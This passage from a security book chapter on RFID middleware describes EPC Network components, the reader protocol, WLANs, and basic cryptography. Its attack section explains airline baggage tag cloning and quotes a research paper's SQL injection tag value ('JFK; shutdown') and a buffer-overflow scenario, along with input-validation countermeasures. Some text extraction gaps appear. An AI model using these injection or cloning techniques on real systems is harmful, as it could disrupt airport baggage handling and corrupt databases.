any industry can create an EPC Access Registry to act as a repository for EPC Information 
Service interface descriptions. Auto-ID EPC Information Service Speciﬁ cation 1.0 deﬁ nes 
the protocol for accessing the EPC Information Service.
Object Name Service
The Object Name Service (ONS) provides a global lookup service for translating an EPC 
into one or more Internet Uniform Reference Locators (URLs). These URLs identify with 
EPC Information Service; however, ONS may also be used to associate EPCs with Web sites 
and other Internet resources relevant to an object.
ONS provides both static and dynamic services. Static ONS typically provides URLs for 
information maintained by an object’s manufacturer. Dynamic ONS records a sequence of 
custodians as an object moves through a supply chain.
ONS is built using the same technology as the Domain Name Service (DNS). Auto-ID 
Object Name Service Speciﬁ cation 1.0 deﬁ nes how ONS works and interfaces with 
applications.
ONS Local Cache
The local ONS cache is used to reduce the need to ask the global ONS for each object, 
because frequently-asked values can be stored in the local cache, which acts as the ﬁ rst 
port of call for ONS-type queries. The local cache can also look up private internal 
EPC’s for asset tracking. Coupled with the local cache are registration functions for 
registering EPC’s with the global and dynamic ONS systems for private tracking and 
collaboration.
EPC Network Data Standards
The operation of EPC Network is subject to the data standards that specify the syntax and 
semantics of the data exchanged among the components.

EPC
The EPC is the fundamental identiﬁ er for a physical object. Auto-ID Electronic Product 
Code Data Speciﬁ cation 1.0 deﬁ nes the abstract content of the EPC in the form of RFID

PML
The PML is a collection of standardized XML vocabularies that are used to represent and 
distribute information related to EPC Network-enabled objects. The PML standardizes 
the content of the messages exchanged within the EPC Network, which is part of the 
Auto-ID Center’s effort to develop standardized interfaces and protocols for communicating 
with and within the Auto-ID infrastructure. The core of the PML (PML Core) provides 
a standardized format for exchanging the data captured by the sensors in the Auto-ID 
infrastructure (e.g., RFID readers). Auto-ID PML Core speciﬁ cation 1.0 deﬁ nes the syntax 
and semantics of the PML Core.
RFID Middleware Overview
RFID middleware sits between the tag readers and the enterprise applications, which are 
intended to address the unique computational requirements presented by EPC applications. 
Many of the unique challenges come from the vastly larger quantity of ﬁ ne-grained data that 
originates from radio frequency (RF) tag readers, as compared to the granularity of data that 
traditional enterprise applications are accustomed to. Hence, a lot of processing performed 
by RFID middleware concerns data reduction operations such as ﬁ ltering, aggregation, and 
counting. Other challenges arise from speciﬁ c features of the EPC architecture, including the 
ONS and PML Service components.
Speciﬁ c requirements for EPC processing vary greatly from application to application. 
Moreover, EPC is in its infancy; as it matures there will be a great deal of innovation and 
change of what applications do. Therefore, the emphasis in the RFID middleware speciﬁ cation 
is on extensibility rather than speciﬁ c processing features. The RFID middleware is deﬁ ned 
in terms of “Processing Modules,” or “Services,” each with a speciﬁ c set of features that can 
be combined to meet the needs of his or her application. The modular structure is designed 
to promote innovation by independent groups of people, avoiding the creation of a single 
monolithic speciﬁ cation that attempts to satisfy all needs for everybody. See Figure 14.2.

Chapter 14 • RFID Attacks: Securing Communications Using RFID Middleware
RFID middleware is a container for processing modules that interact through two 
interfaces deﬁ ned in the speciﬁ cation. The Reader Interface provides the connection to tag 
readers (i.e., RFID readers). The bulk of the details of this interface are speciﬁ ed in Auto-ID 
Reader Protocol Speciﬁ cation 1.0 [ReaderProtocol1.0], however, Savant also permits 
connections to readers via other protocols.
The Application Interface provides a connection to external applications (e.g., existing 
enterprise “backend” applications), but also possibly to new EPC-speciﬁ c applications and 
other Savants’. The Application Interface is deﬁ ned by a protocol that is fully speciﬁ ed in this 
document in terms of command sets, with each command set being deﬁ ned by a Processing 
Module. The Application Interface thus serves as a common conduit between Savant processing 
modules and external applications. (If necessary, processing modules can communicate with 
pre-existing external services using those services’ native protocols.) The Application Interface 
is speciﬁ ed using a layered approach similar to that employed in [ReaderProtocol1.0], where 
one layer deﬁ nes the commands and their abstract syntax, and a lower layer speciﬁ es a binding 
to a particular syntax and protocol (i.e., several bindings can be deﬁ ned).
Besides the two external interfaces deﬁ ned by Savant (Reader Interface and Application 
Interface), Processing Modules can interact with each other through an Application 
Programming Interface (API) that they deﬁ ne themselves. Processing Modules can also 
interact with other external services via interfaces exposed by those services (e.g., one Savant

interacting with another). This speciﬁ cation, however, does not deﬁ ne how Processing 
Modules gain access to such external services.
Notes from the Underground…
Road map (Non-normative)
It is expected that a future version of this speciﬁ cation will specify how processing 
modules access particular external services, especially EPC Information Service, ONS, 
and other Savant instances.
Processing Modules are deﬁ ned by Auto-ID standards, or by users and other third parties. 
The Processing Modules deﬁ ned by Auto-ID standards are called Standard Processing Modules. 
Every implementation of Savant must provide an implementation for every Standard Processing 
Module. Some Standard Processing Modules are required to be present in every deployed 
instance of Savant; these are called REQUIRED Standard Processing Modules. Others may be 
included or omitted by the user in a given deployed instance; these are called OPTIONAL 
Standard Processing Modules.
In Savant Speciﬁ cation 1.0, there are only two Standard Processing Modules deﬁ ned. The 
ﬁ rst is the REQUIRED Standard Processing Module called autoid.core. This Standard Processing 
Module provides a minimal set of Application Interface commands that allow applications to 
learn what other Processing Modules are available and also to get basic information regarding 
what readers are connected to. The second is a REQUIRED Standard Processing Module 
called autoid.readerproxy. This Standard Processing Module provides a means for applications to 
issue commands directly to readers through the Application Interface.
Reader Layer—Operational Overview
The Reader Protocol provides a uniform way for hosts to access and control the conforming 
readers produced by a variety of vendors. Different makes and models of readers vary widely 
in functionality, from “dumb” readers that do little more than report what tags are currently 
in a reader’s RF ﬁ eld, to “smart” readers that provide sophisticated ﬁ ltering, smoothing, 
reporting, and other functionality. The Reader Protocol deﬁ nes a particular collection of 
features that are commonly implemented, and provides a standardized way to access and 
control those features.
Features related to reading tags are exposed through the Reader Protocol (see Figure 14.3).

278 
Chapter 14 • RFID Attacks: Securing Communications Using RFID Middleware
Figure 14.3 models the tag-reading functions of a reader that is organized into several 
distinct processing stages. Information about tag reads is made available to hosts at certain 
stages. In some cases, this information is made available as a response to a command on the 
Command Channel (a “synchronous” delivery of information). In other cases, the information 
is sent autonomously by the reader to the host using the Notiﬁ cation Channel (an “asynchronous” 
delivery). Each stage also has parameters that govern its operation, which can be queried 
and set by the host via the Command Channel.
Not all conforming readers provide every function. Of the six ﬁ gures in the diagram, only 
the functionality corresponding to the ﬁ rst three stages must be implemented. Moreover, 
some readers place more restrictions than others on the parameters set at each stage. This is 
another way the Reader Protocol accounts for differences in functionality between particular 
readers (e.g., a reader that allows an unlimited number of read ﬁ lters provides more function-
ality than a reader that permits only one read ﬁ lter, which in turn provides more functionality 
than a reader that permits no read ﬁ lters. The Reader Protocol provides commands that all 
conforming readers must implement, through which hosts discover the capabilities of a 
particular reader.
Figure 14.3 Reader Protocol

 
RFID Attacks: Securing Communications Using RFID Middleware • Chapter 14 
279
The six stages of the diagram are divided into two subsystems of three stages each: the 
Read Subsystem and the Event Subsystem. All conforming readers must provide Read 
Subsystem functionality. The Read Subsystem acquires data from tag information, and applies 
ﬁ lters that discard some of the data, depending on the tag contents. The Read Subsystem 
produces a ﬁ ltered list of tags every time a new acquisition cycle completes. The Event 
Subsystem reduces this volume of data by generating “events” on a per-tag basis only when 
the state of a particular tag changes in some way (e.g., the Event Subsystem can be 
conﬁ gured to produce output only when a previously unseen tag enters the reader’s ﬁ eld, or 
when a previously seen tag has not been seen for a speciﬁ ed time interval). The Read 
Subsystem is stateless, and the Event Subsystem must maintain state on a per-tag basis.
The Read Subsystem consists of the following three stages:
■ 
Sources A source (e.g., a single antenna of an RF tag reader) reads tags and presents 
the data to the reader. However, sources are not limited to antennas (e.g., a bar code 
scanning wand, and so on). A source can also be “virtual” (e.g., a reader deﬁ nes a source 
that represents tags read on either of its two antennas [which individually might also be 
exposed as independent sources]). In general, a reader segregates tag reads according to 
source, to provide applications with some idea about the external situation in which the 
tag was sensed. Different readers vary widely on what sources are available. The Reader 
Protocol provides commands for discovering the number and names of available 
sources.
■ 
Data Acquisition Stage The data acquisition stage is responsible for acquiring 
tag data from certain sources at speciﬁ c times. The Reader Protocol provides 
parameters whereby hosts can specify the frequency of data acquisition, how many 
attempts are made, the triggering conditions, and so on. Each atomic interval in 
which the data acquisition stage acquires data from one or more tags from a single 
source, is called a read cycle.
■ 
Read Filtering Stage The read ﬁ ltering stage maintains a list of patterns 
conﬁ gured by the host, and uses them to delete data from certain tags read at the 
acquisition stage. The purpose of this stage is to reduce the volume of data by only 
including the tags of interest to the application.
It is important to note that the stages in the diagram are conceptual, and do not 
constrain the design of a conforming reader (e.g., some reader implementations may com-
bine read ﬁ ltering with data acquisition). In particular, readers that implement Auto-ID RF 
tag protocols should use read ﬁ lters conﬁ gured by the host to reduce the time to execute 
(i.e., the “tree walking” part of the RF protocol), when the speciﬁ c ﬁ lter patterns permit it 
to be done. While the design of such a reader does not necessarily include a recognizable 
“data acquisition stage” distinct from a “read ﬁ ltering stage,” from the host’s point of view 
(through the Reader Protocol) it is equivalent to a reader that does.

280 
Chapter 14 • RFID Attacks: Securing Communications Using RFID Middleware
The Event Subsystem consists of three stages:
■ 
Smoothing and Event Generation Stage
■ 
Event Filter Stage
■ 
Report Buffer Stage
Smoothing and Event Generation Stage
This stage reduces the volume of data over time. When a given tag is present in the ﬁ eld of a 
particular source, the Read Subsystem includes that tag in its output each time a read cycle 
completes. A tag present in a particular source for many read cycles generates a lot of data. 
The Event Generation Stage reduces this data by outputting an “event” only when some-
thing interesting happens (e.g., when the tag is ﬁ rst present, and when the tag is no longer 
present.)
Some sources, especially RF tag sources, are inherently unreliable (i.e., a tag within a 
source’s read ﬁ eld may not be sensed during each and every read cycle, which leads to the 
desire for a more elaborate rule for generating presence events. The Reader Protocol deﬁ nes 
a general-purpose smoothing ﬁ lter that can be controlled by the host through parameter 
settings (e.g., the host may require that a tag be present for a certain number of read cycles 
within a certain time interval before a presence event is generated). Not all readers support 
every aspect of the general-purpose smoothing ﬁ lter. Some readers can model by placing 
restrictions on the allowable values of the parameters.
The Smoothing and Event Generation Stage must maintain state information for each 
distinct combination of source and tag ID (e.g., to generate presence events you must 
remember whether a particular tag ID was seen during the previous read cycle. While hosts 
normally receive events generated by this stage through the Event Filter and Report Buffer, 
it is also possible for a host to request a dump of all state information currently maintained 
by the Smoothing and Event Generation stage.
Event Filter Stage
The Smoothing and Event Generation Stage generates an event each time a particular tag 
makes a state transition (e.g., from present to not present). The Event Filter Stage lets hosts 
specify which events will be delivered to the host (e.g., a host may want to learn when tags 
become present, but not when they cease to be present.
Report Buffer Stage
Events generated by the Smoothing and Event Generation Stage and ﬁ ltered by the 
Event Filter Stage are stored in a report buffer. The host may synchronously request 
delivery of all events in the report buffer, or the events may be delivered asynchronously 

 
RFID Attacks: Securing Communications Using RFID Middleware • Chapter 14 
281
in response to various triggers. When events have been delivered to the host, the report 
buffer is cleared.
Interactions with Wireless LANs
Wireless local area network (WLAN) technologies provide the networking and physical 
layers of a traditional LAN using radio frequencies. WLAN nodes generally transmit and 
receive digital data to and from common wireless access points (APs). For RFID deploy-
ments to succeed in the enterprise, seamless interoperation with WLANs is critical. In this 
chapter, we will explain the workings of a WLAN and discuss challenges and solutions 
related to deploying RFID with enterprise WLANs.
Wireless APs are the central hubs of a wireless network and are typically connected to 
a cabled LAN. This network connection allows wireless LAN users to access the cabled 
LAN server’s resources, such as e-mail servers, application servers, intranets, and the 
Internet.
A scheme also exists whereby wireless nodes can set up direct communications to other 
wireless nodes. This can be enabled or disabled at the discretion of systems administrators by 
conﬁ guring the wireless network software. Peer-to-peer networking is generally viewed as a 
security concern in that a nonauthorized user could potentially initiate a peer-to-peer session 
with a valid user, thus creating a security compromise.
Depending on the vendor or solution being used, one of two forms of spread spectrum 
technologies are used within wireless LAN implementations:
■ 
FHSS
■ 
DSSS
There are four commercial wireless LAN solutions available:
■ 
802.11 WLAN
■ 
HomeRF
■ 
802.15 WPAN, based on Bluetooth
■ 
802.16 WMAN
802.11 WLAN
The IEEE 802.11 WLAN standard began in 1989 and was originally intended to provide a 
wireless equivalent to Ethernet (the 802.11 protocol stack is shown in Figure 14.4). It has 
developed a succession of robust enterprise-grade solutions that sometimes meet or exceed 
the demands of the enterprise network.

282 
Chapter 14 • RFID Attacks: Securing Communications Using RFID Middleware
IEEE 802.11 WLANs are designed to provide wireless connectivity to a range of roughly 
300 feet from the base. The lead application being shared over the WLAN is data. Provisions 
are being made to accommodate audio, video, and other forms of streaming multimedia.
The IEEE 802.11 WLAN speciﬁ cation generally provides for the following:
■ 
Wireless connectivity of traditional LAN devices such as workstations, servers, 
printers, and so on
■ 
A common standardized Media Access Control (MAC)layer
■ 
Design that is similar to 802.3 Ethernet (CMSA/CA)

Attacking Middleware with the Air Interface
By nature, RFID tags are dumb devices. Upon query from a reader, they reply with an identiﬁ er, 
usually a number or short string that is used to uniquely identify the tag and the item it is 
attached to. The real brains of any RFID deployment is in the middleware and backend systems.
In most given deployments, the backend is usually a database that provides an interface 
for users to obtain meaningful data.
The system will not work without middleware, and the database application will not 
be functional if it cannot place data into it. A reader spits out numbers or strings with no 
real form; therefore, a database needs a piece of middleware to translate between the reader 
and the database, which is usually done through an application that interacts with the tag. 
The middleware application then plays “ﬁ ll in the blank” when talking to the database, 
creating SQL statements and inserting the relevant information into the right place.
If an RFID deployment is for an airline baggage tracking system, the name of the owner 
of the bag (or an ID number referencing the owner), the ﬂ ight number, and the destination 
airport code may be written to the tag at check in. As the luggage moves through the 
airport’s baggage system, RFID readers track its position to make sure it gets where it is 
supposed to go. The reader queries the tag as it goes by, essentially starting a conversation 
between the tag, the reader, and the database that would go like this:
■ 
Middleware to bag tag: “ID please”
■ 
Bag tag to reader/middleware: “John Smith, AC453, LGA”
■ 
Middleware to database: “Add a bag for ﬂ ight AC453 for passenger John Smith to 
the destination airport LAX manifest”
The middleware translates a small piece of information into a proper statement for the 
database to add to its tables. From there, other applications may record the number of bags 
on the ﬂ ight, or do reconciliation and make sure that John Smith is actually on that ﬂ ight.

284 
Chapter 14 • RFID Attacks: Securing Communications Using RFID Middleware
The system does not necessarily have to interact with a database. The reader and the 
middleware can interact with the baggage system to make sure that the bags on the right 
plane, or that stray bags are queried by staff with portable readers to make sure it gets back 
to the right person.
The middleware makes logical use of the raw information in the database and from the 
tag. In the luggage scenario, knowing the destination is a good start to putting the luggage 
on the right plane; however, a database just holds records, and a tag just holds an ID or a 
piece of information. It takes the logic of middleware to route the luggage to where it needs 
to go. Middleware, however, is not immune from attack. It is probably the weakest link in 
the whole chain because it is so automated.
After the bombing of Pan Am ﬂ ight 103 over Lockerbie, Scotland, airline security began to 
reconcile luggage with the people on the planes. This reconciliation is supposed to prevent some-
one from checking in luggage containing illicit cargo, but then not actually getting on the plane.
RFID has an advantage over the bar code system when tracking down errant bags. 
However, with any advantage, there are also disadvantages.
Let’s look at the baggage scenario again. The tags are probably rewritable because they 
have to program them at the check-in desk. If it’s writable by a clerk, it is probably writable 
by an attacker. Depending on how well the middleware applications are written, there is a 
good chance for an attacker to add baggage to the plane without raising alarm bells. To copy 
a bar-coded tag on site would not be easy (particularly if you did not know the information 
ahead of time), but RFID is a lot smaller and more concealable.
Scanning a legitimate bag with a portable scanner gives a tag’s destination, passenger 
name, and other necessary information. Using that information, a thief can write a duplicate 
tag and attach it to a bag containing illicit luggage. Also, depending on the intelligence of the 
middleware, it might be possible for someone to unwittingly transport illicit luggage. 
A properly written middleware application has a check in place to look for this kind of 
discrepancy (i.e., if John Smith checks in with two bags and three are seen going through 
the airport baggage system, all three bags must be checked).
Even if the tags were not rewritable, cloning a legitimate tag and programming your own 
write-once tag is not unreasonable. Unless the middleware is acutely aware of the tags’ non-
writable serial numbers, it is possible to slip one under the radar. Suddenly, the middleware is 
no longer a simple translator; it also has to be on the lookout for oddities in the database.
In March 2006, Melanie R. Rieback of the Vrije Universiteit Amsterdam, released a 
paper regarding the possibility of using tags and their data to attack the middleware and 
backend database. The paper proposed that there were vulnerabilities in middleware applica-
tions that left room for tags to be written with malicious payloads that could affect backend 
database systems, and possibly lead to a virus.
At the core of the paper was the idea that even though RFID did not have a lot of stor-
age space, it may still be possible to perform certain attacks through special data written to 
the tag. In particular, the paper discussed SQL injection attacks.

 
RFID Attacks: Securing Communications Using RFID Middleware • Chapter 14 
285
An SQL attack uses a normal input ﬁ eld (e.g., a name or other piece of information) 
and appends SQL code hoping that the application submitting the information to the data-
base backend blindly includes the SQL code. A properly written application checks the data 
being entered and ﬁ lters out anything that looks like it does not belong in the database.
Usually these attacks are made through input ﬁ elds on a Web page or through an 
application interface; however, the RFID reader interface is also an input ﬁ eld (read from 
the tag rather than interactively entered by a user) and should be subject to the same type 
of ﬁ ltering.
The crux of their attack is best summed up in the paper on www.rﬁ dvirus.org:
“To boil our result down to a nutshell, infected tags can exploit 
vulnerabilities in the RFID middleware to infect the database. Once a 
virus, worm, or other malware has gotten into the database, subsequent 
tags written from the database may be infected, and the problem may 
spread.
As a ﬁ rst example, suppose the airport middleware has a template for 
queries that says:
“Look up the next ﬂ ight to <x>”
where <x> is the airport code written on the tag when the bag was 
checked in. (To make these examples understandable for people who 
don’t know SQL, we will not discuss actual SQL on this page; subsequent 
pages will give actual SQL examples.) In normal operation, the RFID mid-
dleware reads the tag in front of the reader and gets the built-in ID and 
some application-speciﬁ c data. It then builds a query from it. If the tag 
responds with “LAX” the query would be:
“Look up the next ﬂ ight to LAX”
It then sends this query to the database and gets the answer. Now sup-
pose the bag has a bogus tag in addition to the real one and it contains 
“JFK; shutdown”. Both tags will be seen and processed. When the bogus 
one is processed, the middleware will build this query:
“Look up the next ﬂ ight to JFK; shutdown”
Unfortunately, the semicolon is a valid character in queries and separates commands. 
When given this query, the database might respond:
“AA178; database shutdown completed”
The result is that the attacker has shut down the system. Although this 
exploit is not a virus and does not spread, merely shutting down a major 

286 
Chapter 14 • RFID Attacks: Securing Communications Using RFID Middleware
airport’s baggage system for half an hour until the airport ofﬁ cials can ﬁ gure 
out what happened and can restart the system might delay ﬂ ights and badly 
disrupt air trafﬁ c worldwide due to late arrival of the incoming aircraft.”
Input should be validated by the middleware application before being passed to the 
database. However, further on in the paper they describe situations where that validation, if 
not properly implemented, can cause more problems.
“The countermeasure the RFID middleware should take to thwart this 
type of attack is to carefully check all input for validity. Of course, all 
software should always check all input for validity, but experience shows 
that programmers often forget to check. This attack is known as a SQL 
injection attack. Note that it used only 12 of the 114 bytes available on 
even the cheapest RFID tags. Some of the viruses use a more sophisti-
cated form of SQL injection in which the command after the semicolon 
causes the database to be infected.
As a second example, suppose that the application uses 128-byte tags. 
Naturally, the programmer who wrote the application will allocate a 
128-byte buffer to hold the tag’s reply. However, suppose that the 
attacker uses a 512-byte bogus tag or an even larger one. Reading in 
this unexpectedly large tag may cause the data to overrun the middle-
ware’s buffer and even overwrite the current procedure’s return address 
on the stack so that when it returns, it jumps into the tag’s data, which 
could contain a carefully crafted executable program. Such an attack 
occurs often in the world of PC software where it is called a buffer over-
ﬂ ow attack. To guard against it, the middleware should be prepared to 
handle arbitrarily large strings from the tag.
Thus to prevent RFID exploits, the middleware should be bug free and 
not allow SQL injection, buffer overﬂ ow, or similar attacks. 
Unfortunately, the history of software shows that making a large, com-
plex software system bug free is easier said than done.
Through the RFID interface, SQL injection and buffer overﬂ ow attacks, and attacks to 
the backend in general, are a fairly new idea. Care is put in at the application interface level 
and on database security where users interface; however, the RFID interface is also a valid 
entry point for attackers. At the very least, the RFID interface can be used to insert 
information into the database, unless proper veriﬁ cation systems are in place to ensure that 
only legitimate tags are trusted.
The interesting part of their research was the example of the code that infected the 
database, thus allowing it to write the replication code of any tag scanned after infection. In a 
large compatible system such as an airport, a single infected tag could wreak havoc worldwide.

 
RFID Attacks: Securing Communications Using RFID Middleware • Chapter 14

A lot of controversy was generated when this paper was released. RFID developers were 
quick to call this attack improbable, but they never said impossible. It is safe to assume that 
there were some back room patches being made in the wake of this paper.
Understanding Security Fundamentals 
and Principles of Protection
Security protection starts with the preservation of the conﬁ dentiality, integrity, and 
availability (CIA) of data and computing resources. These three tenets of information 
security, often referred to as “The Big Three,” are sometimes represented by the 
following Figure 14.5.
Figure 14.5 The CIA Triad
As we discuss each of these tenets, it will become clear that in order to provide for a 
reliable and secure wireless environment, you need to ensure that each tenet is properly 
protected. To ensure the preservation of The Big Three and protect the privacy of those 
whose data is stored and ﬂ ows through these data and computing resources, The Big Three 
security tenets are implemented through tried-and-true security practices. These other practices 
enforce “The Big Three” by ensuring proper authentication for authorized access while 
allowing for non-repudiation in identiﬁ cation and resource usage methods, and by permitting 
complete accountability for all activity through audit trails and logs. The Authentication, 
Authorization, and Audit (AAA) (accountability) practices provides the security manager with 
tools that can be used to properly identify and mitigate any possible risks to “The Big Three.”
Understanding PKIs and Wireless Networking
Traditional wired network security uses PKIs to provide privacy, integrity authentication, 
and non-repudiation. Wireless networks support the same basic security activities in order to 
meet the minimum accepted standards for security that is expected.
PKIs are the components used to distribute and manage encryption and digital signature keys 
through a centralized service that establishes a means of creating third-party trusts between users.

288 
Chapter 14 • RFID Attacks: Securing Communications Using RFID Middleware
PKIs comprise a Certiﬁ cate Authority (CA), directory service, and certiﬁ cate veriﬁ cation 
service. The CA is the application that issues and manages keys in the form of certiﬁ cates. 
Directory or look-up services are used to post public information about users or certiﬁ cates 
in use. The certiﬁ cate veriﬁ cation service is an agent of the CA that either directly answers 
user queries about the validity or applicability of an issued certiﬁ cate, or supports a directory, 
look-up, or other third-party agent used to verify certiﬁ cates.
PKI certiﬁ cates are akin to end user identities or electronic passports. They are a means 
of binding encryption or digital signature keys to a user. The AdaptLink™ implementation 
relies on the PKI infrastructure to authenticate RFID tags to the RFID readers, and the 
readers to the network.
Understanding the Role of Encryption 
in RFID Middleware
The Internet is used as a means of daily communication. Most businesses rely on the 
Internet to conduct business. Whether a corporate Web presence, an e-commerce site, or 
e-mail, the Internet is a cornerstone of modern business.
The essential aspect of any given transaction is trust. You must trust that the e-mail you 
received from your best friend in fact came from your best friend. Businesses must know the 
people with whom they conduct business and must trust their partners. Encryption’s 
properties of non-repudiation, conﬁ dentiality, integrity, and authentication are essential for 
establishing trust between parties. Business participants must know that the entities they are 
dealing with are the entities they believe they are. These participants must know whether or 
not they can trust the other entity.
Wireless networks use combinations of different cryptographic ciphers to support the 
required security and functionality within a system. Combinations of symmetric, asymmetric, and 
elliptic curve cryptography ﬁ nd their way within wireless security protocols including Wireless 
Application Protocol (WAP), Wired Equivalent Privacy (WEP), and Secure Sockets Layer (SSL).
Overview of Cryptography
Cryptography is the science of changing information into a form that is unintelligible to all 
but the intended recipient. Cryptography is made up of two parts: encryption and decryption. 
Encryption is the process of turning clear plaintext or data into cipher text or encrypted 
data, while decryption is the process of returning encrypted data or cipher text back to its 
original plaintext form.
The security behind cryptography relies on the premise that only the sender and the 
receiver understand how the data was altered to create the obfuscated message. This 
understanding is provided in the form of keys.

 
RFID Attacks: Securing Communications Using RFID Middleware • Chapter 14 
289
There are generally two types of cryptographic methods, referred to as ciphers, used for 
securing information: symmetric or private key, and asymmetric public key systems.
Symmetric Ciphers
In symmetric ciphers, the same key is used to encrypt and decrypt a message. Shift the 
starting point of the alphabet by three positions—the encryption key is now K=3.
Standard Alphabet: ABCDEFGHIJKLMNOPQRSTUVWXYZ
Cryptographic Alphabet: DEFGHIJKLMNOPQRSTUVWXYZABC
For example:

The weakness of the system lies in the fact that statistical analysis is based on greater 
use of some letters in the language more than others. Julius Caesar was the ﬁ rst to use a 
symmetric cipher to secure his communications to his commanders. The key he used 
consisted of shifting the starting point of the alphabet a certain number of positions, and 
then substituting the letters making up a message with the corresponding letter in the cipher 
alphabet.
The main weakness of this type of encryption is that it is open to statistical analysis. 
Some languages (e.g., English) use some letters more often than others, and as a result, 
cryptanalysts have a starting point from which they can attempt to decrypt a message.
This standard form of symmetric encryption remained relatively unchanged until the 
sixteenth century. At this time, Blaise de Vigenere was tasked by Henry the III to extend 
the Caesar cipher and provide enhanced security. What he proposed was the simultaneous 
use of several different cryptographic alphabets to encrypt a message. The selection of 
which alphabet to use for which letter would be determined though the use of a key word. 
Each letter of the keyword represented one of the cryptographic substitution alphabets. For 
example:
Standard Alphabet 
ABCDEFGHIJKLMNOPQRSTUVWXYZ
Substitution set “A” 
ABCDEFGHIJKLMNOPQRSTUVWXYZ
Substitution set “B” 
BCDEFGHIJKLMNOPQRSTUVWXYZA
Substitution set “C” 
CDEFGHIJKLMNOPQRSTUVWXYZAB
 
...
Substitution set “Z” 
ZABCDEFGHIJKLMNOPQRSTUVWXY

Plaintext:

irwa veai
Ciphertext:

wqia lzws
The main beneﬁ t of the Vigenere cipher is that instead of having a one-to-one relationship 
between each letter of the original message and its substitute, there is a one-to-many 
relationship, which makes statistical analysis all but impossible. While other ciphers were 
devised, the Vigenere-based letter substitution scheme variants remained at the heart of most 
encryption systems up until the mid-twentieth century.
The main difference between modern cryptography and classical cryptography is that it 
leverages the computing power available within devices to build ciphers that perform binary 
operations on blocks of data at a time, instead of on individual letters. The advances in 
computing power also provide a means of supporting the larger key spaces required to 
successfully secure data using public key ciphers.
When using binary cryptography, a key is represented as a string of bits or numbers with 
2n keys. That is, for every bit that is added to a key size, the key space is doubled. The binary 
key space equivalents illustrated in Table 14.1, show how large the key space can be for 
modern algorithms and how difﬁ cult it can be to “break” a key.
Based on a 56-bit key space, the task of discovering the one key used is akin to ﬁ nding 
one red golf ball in a channel ﬁ lled with white golf balls. A 57-bit key would involve ﬁ nding 
the one red golf ball in two of these channels sitting side-by-side. A 58-bit key would be 
four of these channels side-by-side, and so on.
Another advantage of using binary operations is that the encryption and decryption 
operations can be simpliﬁ ed to use bit-based operations such as XOR, shifts, and substitutions, 
and binary arithmetic operations such as addition, subtraction, multiplication, division, and 
raising to a power.

RFID Attacks: Securing Communications Using RFID Middleware • Chapter 14 
291
In addition, several blocks of data (say 64 bits long) can be operated on all at once, 
where portions of the data is combined and substituted with other portions. This can be 
repeated many times, using a different combination or substitution key. Each repetition is 
referred to as a round. The resultant cipher text is now a function of several plaintext bits 
and several subkeys. Examples of modern symmetric encryption ciphers include 56-bit 
DES, Triple DES using keys of roughly 120 bits, RC2 using 40-bit and 1280-bit keys, 
CAST using 40-, 64-, 80-, 128- and 256-bit keys, and IDEA using 128-bit keys among 
others.
Some of the main drawbacks to symmetric algorithms are that they only provide a 
means to encrypt data. Furthermore, they are only as secure as the transmission method used 
to exchange the secret keys between the party encrypting the data, and the party decrypting 
it. As the number of users increases, so does the number of individual keys, to ensure the 
privacy of the data (see Figure 14.6).
Figure 14.6 Symmetric Keys Required to Support Private Communications
The more a symmetric key is used, the greater the statistical data generated that can be 
used to launch brute force and other encryption attacks. The best way to minimize these 
risks is to perform frequent symmetric key changeovers. Manual key exchanges are bulky 
and expensive to perform.
Asymmetric Ciphers
Until the advent of asymmetric or public key cryptography in the late 1970s, the main 
application of cryptography was secrecy. Today, cryptography is used for many things, 
including:
■ 
Preventing unauthorized disclosure of information
■ 
Preventing unauthorized access to data, networks, and applications

292 
Chapter 14 • RFID Attacks: Securing Communications Using RFID Middleware
■ 
Detecting tampering such as the injection of false data or the deletion of data
■ 
Preventing repudiation
The basis of asymmetric cryptography is that the sender and the recipient do not share a 
single key, but rather two separate keys that are mathematically related to one another. 
Knowledge of one key does not imply any information on what the reverse matching key is. 
A real-world example is that of a locker with a combination lock. Knowing the location of a 
locker does not provide any details regarding the combination of the lock that is used to 
secure the door. The magic behind asymmetric algorithms is that the opposite is also true. In 
other words, either one of the keys can be used to encrypt data while the other will decrypt 
it. This relationship makes the free distribution of one of the keys in a key pair to other users 
(referred to as the public key) possible while the other can remain secret (referred to as the 
private key), thereby eliminating the need for a bulky and expensive key distribution process.
This relationship allows asymmetric cryptography to be used as a mechanism that 
supports both encryption and signatures. The main limitations of asymmetric cryptography 
are a slow encryption process and limited size of the encryption payload when compared to 
symmetric cryptography.
Examples of public key cryptography include Rivest, Shamir, & Adleman (RSA), DSA, 
and Difﬁ e-Hellman.
Elliptic Curve Ciphers
Elliptic curve ciphers are being used more within imbedded hardware for their ﬂ exibility, 
security, strength, and limited computational requirements when compared to other 
encryption technologies.
Elliptic curves are simple functions that can be drawn as looping lines in the (x, y) plane. Their 
advantage comes from using a different kind of mathematical group for public key computation.
The easiest way to understand elliptic curves is to imagine an inﬁ nitely large sheet of 
graph paper where the intersections of lines are whole (x, y) coordinates. If a special type of 
elliptic curve is drawn, it can stretch out into inﬁ nity and along the way intersect a ﬁ nite 
number of (x, y) coordinates, rather than a closed ellipse.
At each (x, y) intersection, a dot is drawn. When identiﬁ ed, an addition operation can be 
established between two points that yield a third. The addition operation used to deﬁ ne 
these points forms a ﬁ nite group and represents the key.
Understanding How a Digital Signature Works
The eXtensible Markup Language (XML) digital signature speciﬁ cation (www.w3.org/
TR/2002/REC-xmldsig-core-20020212) includes information on how to describe a digital 
signature using XML and the XML-signature namespace. The signature is generated from a 
hash over the canonical form of the manifest, which can reference multiple XML documents. 

 
RFID Attacks: Securing Communications Using RFID Middleware • Chapter 14 
293
To canonicalize something is to put it in a standard format that everyone uses. Because the 
signature is dependent on the content it is signing, a signature produced from a noncanonical-
ized document could be different from that produced from a canonicalized document. 
Remember that this speciﬁ cation is about deﬁ ning digital signatures in general, not just those 
involving XML documents. The manifest may also contain references to any digital content 
that can be addressed or to part of an XML document.
Basic Digital Signature and Authentication Concepts
Knowing how digital signatures work is helpful to better understand the speciﬁ cation. The 
goal of a digital signature is to provide three things for the data. To ensure integrity, a digital 
signature must provide a way to verify that the data has not been modiﬁ ed or replaced. For 
authentication, the signature must provide a way to establish the identity of the data’s 
originator. For non-repudiation, the signature must provide the ability for the data’s integrity 
and authentication to be provable to a third party.
Why a Signature Is Not a MAC
Message authentication codes (MACs) are a way to assure data integrity and to 
authenticate data. MACs are used by having the message creator perform a one-way 
cryptographic hash operation, which requires a secret key in order to function. The 
MAC and the data are then sent to the recipient. The recipient uses the same secret key 
to independently generate the hash value, and compares that calculation with the one 
that was sent. We assume that the receiver has the secret key and that it is and always 
